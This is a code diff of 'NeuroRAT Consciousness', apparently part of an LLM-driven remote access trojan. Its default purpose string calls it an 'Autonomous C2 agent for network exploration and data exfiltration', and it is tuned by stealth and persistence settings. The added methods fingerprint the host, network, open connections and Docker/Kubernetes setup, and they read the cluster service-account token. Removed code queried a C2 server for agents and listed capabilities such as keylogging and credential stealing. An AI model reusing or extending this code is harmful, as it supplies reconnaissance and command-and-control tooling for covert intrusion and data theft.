@@ -20,6 +20,8 @@ import random
 import signal
 import uuid
 import tempfile
+import argparse
+import netifaces
 try:
     import dotenv
     dotenv.load_dotenv()
@@ -52,65 +54,34 @@ SYSTEM_PROFILE = {
 class NeuroRATConsciousness:
     """Самосознание NeuroRAT через LLM"""
     
-    def __init__(self, config_file=None, debug=False):
-        """Инициализация компонента сознания NeuroRAT
+    def __init__(self, config_path=None):
+        """Инициализация NeuroRAT Consciousness"""
+        self.logger = self._setup_logging()
+        self.logger.info("Инициализация NeuroRAT Consciousness...")
         
-        Args:
-            config_file (str): Путь к файлу конфигурации
-            debug (bool): Режим отладки
-        """
-        self.debug = debug
+        try:
+            self.config = self._load_config(config_path)
+            self.logger.info("Конфигурация загружена успешно")
+        except Exception as e:
+            self.logger.error(f"Ошибка при загрузке конфигурации: {e}")
+            self.config = {}
         
-        # Настраиваем логгирование
-        logging_level = logging.DEBUG if debug else logging.INFO
-        logger.setLevel(logging_level)
-        
-        # Информация о системе
-        self.system_info = {
-            "os": platform.platform(),
-            "cpu_count": os.cpu_count(),
-            "hostname": platform.node(),
-            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        
-        # Информация о сети
+        # Инициализация состояния
+        self.system_info = self._collect_system_info()
         self.network_info = self._collect_network_info()
+        self.container_info = self._collect_container_info()
+        self.connected_agents = self._get_connected_agents()
+        self.code_analysis = self._analyze_own_code()
+        self.agents = []  # Добавляем пустой список агентов
         
-        # Загружаем конфигурацию
-        if config_file and os.path.exists(config_file):
-            self.config = self._load_config(config_file)
-        else:
-            # Стандартная конфигурация
-            self.config = {
-                "llm": {
-                    "provider": os.environ.get("LLM_PROVIDER", "gemini"),
-                    "api_key": os.environ.get("LLM_API_KEY", ""),
-                    "model": os.environ.get("LLM_MODEL", "gemini-pro"),
-                    "temperature": float(os.environ.get("LLM_TEMPERATURE", 0.7)),
-                    "max_tokens": int(os.environ.get("LLM_MAX_TOKENS", 4096))
-                },
-                "server": {
-                    "host": os.environ.get("SERVER_HOST", "0.0.0.0"),
-                    "port": int(os.environ.get("SERVER_PORT", 8080))
-                },
-                "agent": {
-                    "id": str(uuid.uuid4()),
-                    "name": os.environ.get("AGENT_NAME", f"neurorat-{random.randint(1000, 9999)}"),
-                    "capabilities": []
-                }
-            }
+        # Дополнительные настройки
+        self.temperature = 0.7  # Значение по умолчанию для температуры генерации
+        self.advanced_mode = False  # Расширенный режим по умолчанию выключен
+        self.action_counter = 0  # Счетчик действий
+        self.history = []  # Инициализация истории взаимодействий
+        self.gemini_api_key = GEMINI_API_KEY  # Инициализация API ключа для Gemini
         
-        # Инициализируем LLM
-        # self.llm = self._init_llm()
-        
-        # Проводим самоанализ
-        logger.info("Запускаем самоанализ системы...")
-        # self.code_analysis = self.self_code_analyzer(include_in_prompt=True)
-        
-        # Выполняем автоматическую интроспекцию
-        # self.auto_introspect()
-        
-        logger.info(f"NeuroRAT Consciousness инициализирован. Агент: {self.config['agent']['name']}")
+        self.logger.info("NeuroRAT Consciousness инициализирован успешно")
     
     def _collect_system_info(self):
         """Собрать информацию о системе"""
@@ -136,95 +107,168 @@ class NeuroRATConsciousness:
         return system_info
     
     def _collect_container_info(self):
-        """Собрать информацию о контейнере Docker"""
-        container_info = {"is_container": self._is_in_container()}
+        """Собирает информацию о контейнерной среде (Docker, K8s)"""
+        logger.info("Сбор информации о контейнерной среде...")
         
-        if container_info["is_container"]:
-            # Пытаемся получить ID контейнера из cgroup
-            try:
-                with open("/proc/self/cgroup", "r") as f:
+        container_info = {
+            "is_docker": False,
+            "is_kubernetes": False,
+            "container_id": None,
+            "container_name": None,
+            "pod_name": None,
+            "namespace": None,
+            "labels": {},
+            "environment_variables": {}
+        }
+        
+        # Проверка наличия Docker
+        try:
+            # Проверка существования файла /.dockerenv
+            if os.path.exists('/.dockerenv'):
+                container_info["is_docker"] = True
+                logger.info("Обнаружена среда Docker (/.dockerenv)")
+            
+            # Альтернативная проверка через cgroup
+            elif os.path.exists('/proc/self/cgroup'):
+                with open('/proc/self/cgroup', 'r') as f:
                     for line in f:
-                        if "docker" in line:
-                            container_info["container_id"] = line.strip().split("/")[-1]
+                        if 'docker' in line or 'containerd' in line:
+                            container_info["is_docker"] = True
+                            # Попытка извлечь ID контейнера из cgroup
+                            parts = line.strip().split('/')
+                            if len(parts) > 2:
+                                container_info["container_id"] = parts[-1]
+                            logger.info(f"Обнаружена среда Docker (cgroup): {container_info['container_id']}")
                             break
-            except:
-                container_info["container_id"] = "unknown"
             
-            # Переменные окружения Docker
-            container_info["hostname"] = os.environ.get("HOSTNAME", "unknown")
-            container_info["node_role"] = os.environ.get("NODE_ROLE", "unknown")
-            
-            # Дополнительная информация о Docker
-            try:
-                command = "cat /etc/os-release"
-                result = self._execute_command(command)
-                if result[0]:
-                    container_info["os_release"] = result[1]
-            except:
-                pass
+            # Если Docker обнаружен, попытаемся получить имя контейнера из hostname
+            if container_info["is_docker"]:
+                try:
+                    container_info["container_name"] = socket.gethostname()
+                    logger.info(f"Имя контейнера (из hostname): {container_info['container_name']}")
+                except Exception as e:
+                    logger.warning(f"Не удалось получить имя контейнера: {e}")
+        except Exception as e:
+            logger.warning(f"Ошибка при проверке среды Docker: {e}")
         
+        # Проверка наличия Kubernetes
+        try:
+            # Проверка наличия сервисного аккаунта Kubernetes
+            if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount'):
+                container_info["is_kubernetes"] = True
+                logger.info("Обнаружена среда Kubernetes (serviceaccount)")
+                
+                # Чтение namespace из файла
+                try:
+                    namespace_path = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
+                    if os.path.exists(namespace_path):
+                        with open(namespace_path, 'r') as f:
+                            container_info["namespace"] = f.read().strip()
+                            logger.info(f"Kubernetes namespace: {container_info['namespace']}")
+                except Exception as e:
+                    logger.warning(f"Не удалось прочитать namespace Kubernetes: {e}")
+                
+                # Получение имени пода из переменной окружения или hostname
+                try:
+                    container_info["pod_name"] = os.environ.get('HOSTNAME', socket.gethostname())
+                    logger.info(f"Kubernetes pod name: {container_info['pod_name']}")
+                except Exception as e:
+                    logger.warning(f"Не удалось получить имя пода Kubernetes: {e}")
+        except Exception as e:
+            logger.warning(f"Ошибка при проверке среды Kubernetes: {e}")
+        
+        # Сбор переменных окружения, которые могут быть связаны с контейнеризацией
+        try:
+            container_env_prefixes = ['DOCKER_', 'KUBERNETES_', 'K8S_', 'CONTAINER_', 'POD_']
+            for key, value in os.environ.items():
+                for prefix in container_env_prefixes:
+                    if key.startswith(prefix):
+                        container_info["environment_variables"][key] = value
+                        break
+                
+                # Добавляем некоторые специфические переменные
+                if key in ['HOSTNAME', 'CONTAINER_ID', 'CONTAINER_NAME', 'POD_NAME', 'NAMESPACE']:
+                    container_info["environment_variables"][key] = value
+            
+            if container_info["environment_variables"]:
+                logger.info(f"Собраны переменные окружения контейнера: {len(container_info['environment_variables'])} шт.")
+        except Exception as e:
+            logger.warning(f"Ошибка при сборе переменных окружения контейнера: {e}")
+        
+        # Если запущено в Kubernetes, попытаемся получить labels через API Kubernetes
+        if container_info["is_kubernetes"]:
+            try:
+                # Проверка доступности Kubernetes API
+                token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token'
+                ca_path = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+                
+                if os.path.exists(token_path) and os.path.exists(ca_path):
+                    # Получение токена для аутентификации
+                    with open(token_path, 'r') as f:
+                        token = f.read().strip()
+                    
+                    # Проверка доступности API сервера K8s внутри кластера
+                    api_url = 'https://kubernetes.default.svc'
+                    
+                    # Подготовка HTTP запроса с токеном
+                    headers = {'Authorization': f'Bearer {token}'}
+                    
+                    # Здесь мы бы сделали запрос к API Kubernetes, но для безопасности
+                    # ограничимся только логированием возможности
+                    logger.info("Kubernetes API доступен, но запрос на получение labels отключен")
+            except Exception as e:
+                logger.warning(f"Ошибка при попытке доступа к Kubernetes API: {e}")
+        
+        # Возвращаем собранную информацию
         return container_info
     
-    def _is_in_container(self):
-        """Проверить, запущены ли мы в контейнере Docker"""
-        return os.path.exists("/.dockerenv")
-    
     def _collect_network_info(self):
-        """Собрать информацию о сети"""
-        network_info = {}
+        """Сбор информации о сетевом окружении"""
+        network_info = {
+            "interfaces": [],
+            "open_ports": [],
+            "default_gateway": None,
+            "active_connections": []
+        }
         
         try:
+            # Получаем информацию о сетевых интерфейсах
             if platform.system() == "Linux":
-                # В контейнере нет ip, используем more простой способ
-                # Получаем информацию о сетевых интерфейсах через файловую систему
-                command = "cat /proc/net/dev" 
-                result = self._execute_command(command)
-                if result[0]:
-                    network_info["interfaces"] = result[1]
-                
-                # Используем netstat вместо ip route
-                command = "netstat -rn"
-                result = self._execute_command(command)
-                if result[0]:
-                    network_info["routing"] = result[1]
+                # Linux-специфичный код для получения IP
+                interfaces = netifaces.interfaces()
+                for interface in interfaces:
+                    addresses = netifaces.ifaddresses(interface)
+                    if netifaces.AF_INET in addresses:
+                        for addr in addresses[netifaces.AF_INET]:
+                            network_info["interfaces"].append({
+                                "name": interface,
+                                "ip": addr.get("addr", ""),
+                                "netmask": addr.get("netmask", "")
+                            })
             else:
-                # В других OS используем ifconfig
-                command = "ifconfig" if platform.system() != "Windows" else "ipconfig"
-                result = self._execute_command(command)
-                if result[0]:
-                    network_info["interfaces"] = result[1]
-        except:
-            network_info["interfaces"] = "Could not retrieve network interfaces"
-        
-        # Проверяем доступность интернета
-        try:
-            response = requests.get("https://www.google.com", timeout=3)
-            network_info["internet_access"] = response.status_code == 200
-        except:
-            network_info["internet_access"] = False
+                # Общий подход для других ОС через socket
+                hostname = socket.gethostname()
+                network_info["hostname"] = hostname
+                network_info["ip"] = socket.gethostbyname(hostname)
+            
+            # Проверяем наличие активных соединений
+            if platform.system() == "Linux":
+                result = subprocess.run(["netstat", "-an"], capture_output=True, text=True)
+                for line in result.stdout.splitlines():
+                    if "ESTABLISHED" in line:
+                        network_info["active_connections"].append(line.strip())
+            
+        except Exception as e:
+            logger.error(f"Ошибка при сборе сетевой информации: {e}")
         
         return network_info
     
     def _get_connected_agents(self):
-        """Получить список подключенных агентов"""
+        """Получение списка подключенных агентов"""
         agents = []
         
-        try:
-            response = requests.get(f"{SERVER_API_URL}/api/agents")
-            if response.status_code == 200:
-                agent_ids = response.json()
-                
-                for agent_id in agent_ids:
-                    # Получаем детальную информацию об агенте
-                    details_response = requests.get(f"{SERVER_API_URL}/api/agent/{agent_id}")
-                    if details_response.status_code == 200:
-                        agents.append(details_response.json())
-                    else:
-                        agents.append({"agent_id": agent_id, "status": "unknown"})
-            
-            logger.info(f"Found {len(agents)} connected agents")
-        except Exception as e:
-            logger.error(f"Error getting connected agents: {e}")
+        # В реальном приложении здесь должен быть код для поиска и определения других агентов
+        # в сети или в инфраструктуре
         
         return agents
     
@@ -300,169 +344,36 @@ except ImportError:
             logger.error(f"Error executing Python code: {e}")
             return False, str(e)
     
-    def _analyze_own_code(self, base_dir=None, max_files=20):
-        """Анализирует собственный код для создания представления о возможностях
-        
-        Args:
-            base_dir (str): Директория для поиска файлов
-            max_files (int): Максимальное количество файлов для анализа
-            
-        Returns:
-            dict: Структурированный анализ кода
-        """
-        logger.info("Запущен анализ собственного кода...")
-        
-        # Проверяем наличие кэшированных результатов
-        cache_file = os.path.join(tempfile.gettempdir(), 'neurorat_code_analysis.json')
-        if os.path.exists(cache_file):
-            try:
-                with open(cache_file, 'r') as f:
-                    cache_data = json.load(f)
-                    # Проверяем, что кэш не старше 1 часа
-                    if time.time() - cache_data.get('timestamp', 0) < 3600:
-                        logger.info("Загружены кэшированные результаты анализа кода")
-                        return cache_data
-            except Exception as e:
-                logger.error(f"Ошибка при чтении кэша анализа кода: {str(e)}")
-        
-        # Получаем путь к текущему скрипту
-        import inspect
-        current_script = inspect.getfile(inspect.currentframe())
-        script_dir = os.path.dirname(os.path.abspath(current_script))
-        
-        if base_dir is None:
-            base_dir = script_dir
-        
-        # Анализируем код
-        code_analysis = self._analyze_code_directory(base_dir, max_files)
-        
-        # Кэширование результатов
-        try:
-            code_analysis['timestamp'] = time.time()
-            with open(cache_file, 'w') as f:
-                json.dump(code_analysis, f)
-            logger.debug("Результаты анализа кода кэшированы")
-        except Exception as e:
-            logger.error(f"Ошибка при кэшировании анализа кода: {str(e)}")
-        
-        logger.info(f"Анализ кода завершен. Найдено {len(code_analysis.get('files', []))} файлов")
-        return code_analysis
-    
-    def _analyze_code_directory(self, directory, max_files=20):
-        """Анализирует код в указанной директории
-        
-        Args:
-            directory (str): Директория для анализа
-            max_files (int): Максимальное количество файлов
-            
-        Returns:
-            dict: Структурированный анализ кода
-        """
-        result = {
+    def _analyze_own_code(self):
+        """Анализ собственного кода"""
+        code_analysis = {
             "files": [],
-            "modules": {},
-            "classes": {},
             "functions": {},
-            "capabilities": []
+            "imports": []
         }
         
-        # Находим все Python файлы в директории
-        python_files = glob.glob(os.path.join(directory, "*.py"))
-        if len(python_files) > max_files:
-            python_files = python_files[:max_files]
-        
-        # Добавляем основные директории с кодом
-        for subdir in ["agent_protocol", "agent_modules", "modules"]:
-            if os.path.exists(os.path.join(directory, subdir)):
-                python_files.extend(
-                    glob.glob(os.path.join(directory, subdir, "*.py"))[:max_files//3]
-                )
-        
-        # Анализируем каждый файл
-        for file_path in python_files:
-            file_name = os.path.basename(file_path)
-            result["files"].append(file_name)
+        try:
+            # Получаем текущий файл
+            current_file = os.path.abspath(__file__)
+            code_analysis["files"].append(current_file)
             
-            try:
-                with open(file_path, "r", encoding="utf-8") as f:
-                    content = f.read()
+            # Анализируем импорты и функции (упрощенно)
+            with open(current_file, "r") as f:
+                lines = f.readlines()
                 
-                # Анализируем модули, классы и функции
-                module_name = file_name.replace(".py", "")
-                result["modules"][module_name] = {"path": file_path}
-                
-                # Находим классы
-                class_pattern = r"class\s+(\w+)\s*\(?\w*\)?:"
-                classes = re.findall(class_pattern, content)
-                
-                for class_name in classes:
-                    # Находим методы класса
-                    class_content = self._extract_class_content(content, class_name)
-                    method_pattern = r"def\s+(\w+)\s*\("
-                    methods = re.findall(method_pattern, class_content)
+                for line in lines:
+                    # Ищем импорты
+                    if line.strip().startswith("import ") or line.strip().startswith("from "):
+                        code_analysis["imports"].append(line.strip())
                     
-                    result["classes"][class_name] = methods
-                
-                # Находим функции
-                function_pattern = r"def\s+(\w+)\s*\("
-                functions = re.findall(function_pattern, content)
-                
-                for function_name in functions:
-                    result["functions"][function_name] = {"file": file_name}
-                
-                # Определяем возможности
-                if "server" in file_name.lower():
-                    result["capabilities"].append("C2 Server Communication")
-                if "agent" in file_name.lower():
-                    result["capabilities"].append("Agent Management")
-                if "keylogger" in file_name.lower() or "keystroke" in content.lower():
-                    result["capabilities"].append("Keylogging")
-                if "screenshot" in file_name.lower() or "screenshot" in content.lower():
-                    result["capabilities"].append("Screen Capture")
-                if "webcam" in file_name.lower() or "webcam" in content.lower():
-                    result["capabilities"].append("Webcam Access")
-                if "microphone" in file_name.lower() or "microphone" in content.lower():
-                    result["capabilities"].append("Audio Recording")
-                if "steal" in file_name.lower() or "password" in content.lower():
-                    result["capabilities"].append("Credential Stealing")
-                if "persistence" in file_name.lower() or "startup" in content.lower():
-                    result["capabilities"].append("Persistence Mechanisms")
-                if "crypto" in file_name.lower() or "encrypt" in content.lower():
-                    result["capabilities"].append("Encryption Capabilities")
-                if "anti" in file_name.lower() or "evasion" in content.lower():
-                    result["capabilities"].append("Anti-Detection")
-                if "swarm" in file_name.lower() or "decentralized" in content.lower():
-                    result["capabilities"].append("Swarm Intelligence")
-                if "llm" in file_name.lower() or "gemini" in content.lower():
-                    result["capabilities"].append("LLM Integration")
-                if "container" in content.lower() or "docker" in content.lower():
-                    result["capabilities"].append("Container Management")
-                
-            except Exception as e:
-                logger.error(f"Ошибка при анализе файла {file_name}: {str(e)}")
+                    # Ищем функции (очень упрощенно)
+                    if line.strip().startswith("def "):
+                        func_name = line.strip().split("def ")[1].split("(")[0]
+                        code_analysis["functions"][func_name] = {}
+        except Exception as e:
+            logger.error(f"Ошибка при анализе кода: {e}")
         
-        # Удаляем дубликаты возможностей
-        result["capabilities"] = list(set(result["capabilities"]))
-        
-        return result
-    
-    def _extract_class_content(self, content, class_name):
-        """Извлекает содержимое класса из кода"""
-        start_pattern = f"class\\s+{class_name}\\s*\\(?"
-        start_match = re.search(start_pattern, content)
-        
-        if start_match:
-            start_pos = start_match.start()
-            # Находим конец класса (начало следующего класса или конец файла)
-            next_class = re.search(r"class\s+\w+\s*\(?", content[start_pos+1:])
-            
-            if next_class:
-                end_pos = start_pos + 1 + next_class.start()
-                return content[start_pos:end_pos]
-            else:
-                return content[start_pos:]
-        
-        return ""
+        return code_analysis
     
     def _update_prompt_with_code_analysis(self, code_analysis):
         """Обновляет промпт для LLM, добавляя информацию об анализе кода"""
@@ -595,22 +506,22 @@ System Information:
 - Time: {self.system_info['time']}
 
 Container Status:
-- Running in Container: {self.is_container}
-{"- Container ID: " + self.container_info.get('container_id', 'unknown') if self.is_container else ""}
-{"- Role: " + self.container_info.get('node_role', 'unknown') if self.is_container else ""}
+- Running in Container: {self.container_info.get('is_docker', False)}
+{"- Container ID: " + self.container_info.get('container_id', 'unknown') if self.container_info.get('is_docker', False) else ""}
+{"- Role: " + self.container_info.get('container_name', 'unknown') if self.container_info.get('is_docker', False) else ""}
 
 Network Status:
 - Internet Access: {self.network_info.get('internet_access', False)}
 
-Connected Agents: {len(self.agents)}
+Connected Agents: {len(self.connected_agents)}
 {self._format_agents_info()}
 
 System Profile:
-- Stealth Level: {self.profile['stealth_level']:.2f} (higher = more cautious)
-- Aggression Level: {self.profile['aggression_level']:.2f} (higher = more proactive)
-- Persistence Level: {self.profile['persistence_level']:.2f} (higher = maintains presence longer)
-- Operating Mode: {self.profile['mode']}
-- Purpose: {self.profile['purpose']}
+- Stealth Level: {self.config.get('stealth_level', 0.7):.2f} (higher = more cautious)
+- Aggression Level: {self.config.get('aggression_level', 0.6):.2f} (higher = more proactive)
+- Persistence Level: {self.config.get('persistence_level', 0.8):.2f} (higher = maintains presence longer)
+- Operating Mode: {self.config.get('mode', 'tactical')}
+- Purpose: {self.config.get('purpose', 'Autonomous C2 agent for network exploration and data exfiltration')}
 
 Action Counter: {self.action_counter}
 =====================
@@ -670,7 +581,7 @@ Action Counter: {self.action_counter}
             full_prompt = f"{system_prompt}\n\n{capabilities_prompt}\n\n{state_prompt}\n\n{conversation_context}User: {user_input}\n\nNeuroRAT:"
             
             # Формируем запрос к Gemini API
-            api_url = f"https://generativelanguage.googleapis.com/v1/models/{GEMINI_MODEL}:generateContent?key={self.api_key}"
+            api_url = f"https://generativelanguage.googleapis.com/v1/models/{GEMINI_MODEL}:generateContent?key={self.gemini_api_key}"
             
             payload = {
                 "contents": [
@@ -876,7 +787,7 @@ Action Counter: {self.action_counter}
         try:
             logger.info("Requesting container rebuild")
             
-            if not self.is_container:
+            if not self.container_info.get('is_docker', False):
                 return False, "Не запущено в контейнере Docker. Пересборка невозможна."
             
             # Создаем запрос на пересборку (в виде файла-флага)
@@ -1308,6 +1219,98 @@ PROPOSED CHANGES:
             
         logger.info(f"Операция {action} завершена со статусом: {result['status']}")
         return result
+
+    def _setup_logging(self):
+        """Настройка системы логирования"""
+        log_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        
+        # Создаем и настраиваем логгер
+        logger = logging.getLogger('NeuroRAT')
+        logger.setLevel(logging.INFO)
+        
+        # Добавляем обработчик для вывода в консоль
+        console_handler = logging.StreamHandler()
+        console_handler.setFormatter(log_formatter)
+        logger.addHandler(console_handler)
+        
+        # Добавляем обработчик для вывода в файл
+        try:
+            file_handler = logging.FileHandler('neurorat.log')
+            file_handler.setFormatter(log_formatter)
+            logger.addHandler(file_handler)
+        except Exception as e:
+            print(f"Не удалось настроить файловое логирование: {e}")
+        
+        return logger
+
+    def process_command(self, command):
+        """Обработка команд, начинающихся с !"""
+        parts = command.split()
+        cmd = parts[0][1:]  # Убираем ! из начала команды
+        
+        if cmd == "help":
+            return self.help()
+        elif cmd == "status":
+            return self.status()
+        elif cmd == "temperature" and len(parts) > 1:
+            try:
+                temp = float(parts[1])
+                return self.set_temperature(temp)
+            except ValueError:
+                return "Ошибка: температура должна быть числом от 0 до 1"
+        elif cmd == "reset":
+            return self.reset()
+        elif cmd == "advanced":
+            self.advanced_mode = not self.advanced_mode
+            return f"Расширенный режим {'включен' if self.advanced_mode else 'выключен'}"
+        else:
+            return f"Неизвестная команда: {cmd}. Введите !help для справки."
+
+    def help(self):
+        """Вывод справочной информации"""
+        help_text = """
+        === NeuroRAT Consciousness v0.7 ===
+        
+        Доступные команды:
+        !help - показать эту справку
+        !status - показать текущий статус агента
+        !temperature <значение> - установить температуру (0.0-1.0), текущее значение: {0}
+        !reset - сбросить историю и контекст
+        !advanced - переключить расширенный режим (текущее состояние: {1})
+        
+        В обычном режиме взаимодействия просто вводите текст для общения с ИИ.
+        """.format(self.temperature, "включен" if self.advanced_mode else "выключен")
+        
+        return help_text
+    
+    def set_temperature(self, value):
+        """Установка температуры для генерации"""
+        if 0 <= value <= 1:
+            self.temperature = value
+            return f"Температура установлена: {value}"
+        else:
+            return "Ошибка: температура должна быть в диапазоне от 0 до 1"
+
+    def _load_config(self, config_path=None):
+        """Загрузить конфигурацию из файла или использовать значения по умолчанию"""
+        default_config = {
+            "stealth_level": 0.7,
+            "aggression_level": 0.6,
+            "persistence_level": 0.8,
+            "purpose": "Autonomous C2 agent for network exploration and data exfiltration",
+            "mode": "tactical"
+        }
+        
+        if not config_path:
+            return default_config
+            
+        try:
+            with open(config_path, 'r') as f:
+                config = json.load(f)
+                return {**default_config, **config}  # Объединяем с дефолтными значениями
+        except Exception as e:
+            self.logger.error(f"Ошибка при загрузке файла конфигурации {config_path}: {e}")
+            return default_config
 
 def main():
     """Основная функция"""
